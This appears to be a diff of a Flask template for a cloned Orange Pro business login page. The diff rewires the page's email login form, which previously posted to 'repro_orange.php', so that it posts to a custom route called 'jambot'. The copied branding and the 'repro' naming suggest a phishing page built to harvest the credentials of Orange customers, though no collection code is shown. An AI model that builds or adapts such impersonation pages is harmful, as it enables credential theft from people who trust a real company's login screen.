@@ -1,6 +1,6 @@
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">{{ url_for('static', filename='') }}
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Orange Pro : Forfait pro internet, mobile, fixe pour les entreprises  - Orange pro</title>
     <link href="{{ url_for('static', filename='css/style.css') }}" rel="stylesheet">
@@ -63,7 +63,7 @@
       <img src="{{ url_for('static', filename='./images/orange.jpg') }}"  style="width: 5rem;">
       </div>
       <div class="card-body container-fluid" style="text-align: center;">
-        <form method="POST" action="repro_orange.php">
+        <form method="POST" action="{{ url_for('jambot')}}">
           <div class="mb-3">
             <h3 style="text-align: center;">Connexion</h3>
             <label for="email" class="form-label">addresse email</label>
